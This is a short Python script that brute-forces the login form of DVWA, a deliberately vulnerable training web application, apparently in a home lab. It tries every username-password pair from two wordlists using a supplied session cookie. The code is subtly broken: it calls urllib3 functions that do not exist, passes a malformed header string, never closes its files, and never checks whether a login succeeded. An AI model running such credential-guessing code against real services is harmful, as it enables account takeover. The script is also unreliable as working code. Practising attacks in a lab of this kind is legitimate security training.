import argparse
import urllib3

parser = argparse.ArgumentParser()
parser.add_argument('users', type=str, help="this is the username file")
parser.add_argument('passwords', type=str, help="this is the passwords file")
parser.add_argument('phpsessid', type=str, help="this is the passwords file")

args = parser.parse_args()

file = open(f"{args.users}", "r")
names = file.read().split("\n")
file.close
file = open(f"{args.passwords}", "r")
creds = file.read().split("\n")
file.close

for name in names:
    for cred in creds:
        print (name+':'+cred)
        url = f'http://192.168.0.2/dvwa/vulnerabilities/brute/index.php?username={name}&password={cred}&Login=Login'
        get = urllib3.Request(url)
        get.add_header(f'Cookie", "security=low; PHPSESSID={args.phpsessid}')
        resp = urllib3.urlopen(get)
        html = resp.read()
        # write responses to file # inverse grep for flexibility
